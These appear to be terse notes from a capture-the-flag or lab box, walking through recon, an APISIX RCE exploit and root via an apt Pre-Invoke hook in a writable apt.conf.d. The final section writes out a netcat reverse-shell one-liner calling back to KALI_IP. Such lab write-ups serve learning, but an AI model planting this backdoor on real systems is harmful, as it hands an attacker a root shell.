nmap shows ports 22, 80 web, 3306 mysql open
Nothing interesting on surface of 80
deep nmap uncovers ports 9443, 43500

port 43500 reveals to be running APISIX 2.8
we searchsploit APISIX, and there's an rce exploit for APISIX 2.12.X
we load it, run it, and get a shell
franklin!

---
./etcdctl --user=root:123 user passwd myuser
ETCDCTL_USERNAME="root:password" etcdctl set my-key to-a-value

crontab shows `apt-get update` being run by root
We think this is a $PATH privesc, put a revshell, u+s and all into a file called apt-get in /dev/shm, and modify the path, but it doesnt work

HINT TAKEN : google "crontab apt-get" exploit
The gist is, "if there's an apt-get update in crontab, and if theres a dir `/etc/apt/apt.conf.d` with writable permission, we can write a file in the dir, which would 'pre-invoke' extra code, before cron invokes the main code, which is apt-get"

"**apt.conf.d** has full permission (You can also manually check to ensure the writable directory using find command). Therefore, we will create a malicious file inside apt.conf.d by injecting netcat reverse backdoor:"
Now, Using apt package manager Pre-Invoke

`echo 'apt::Update::Pre-Invoke {“rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc KALI_IP 1234 >/tmp/f”};’ > pwn`
This is a pre-invoke technique in apt-get package manager where we are able to run our commands before apt-get is executes the specified arguement (like apt-get update)

root!
